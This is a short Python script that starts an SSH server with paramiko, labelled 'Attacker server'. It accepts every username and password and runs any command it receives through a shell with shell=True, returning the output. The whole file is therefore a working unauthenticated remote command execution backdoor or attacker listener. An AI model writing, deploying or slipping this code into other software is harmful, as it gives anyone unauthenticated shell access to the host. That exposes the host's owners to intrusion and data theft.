
import socket
import paramiko
import threading
import subprocess

class AttackerServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        # Accepting every Username/Password
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_exec_request(self, channel, command):
        output = subprocess.check_output(command, shell=True)
        channel.send(output)
        channel.send_exit_status(0)
        return True


ssh_host = '0.0.0.0'
ssh_port = 2223
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((ssh_host, ssh_port))  
server_socket.listen(100) 

print('Attacker server started. Waiting for connections...')

while True:
    client, addr = server_socket.accept() 
    print(f'Got a connection from {addr}.')
    transport = paramiko.Transport(client)
    transport.add_server_key(paramiko.RSAKey.generate(bits=2048)) 
    server = AttackerServer()
    try:
        transport.start_server(server=server)
        print('SSH negotiation started.')
    except paramiko.SSHException:
        print('SSH negotiation failed.')
        continue
    chan = transport.accept(20)
    print('Channel accepted.')
    chan.send("This is the Attacker server.\n")


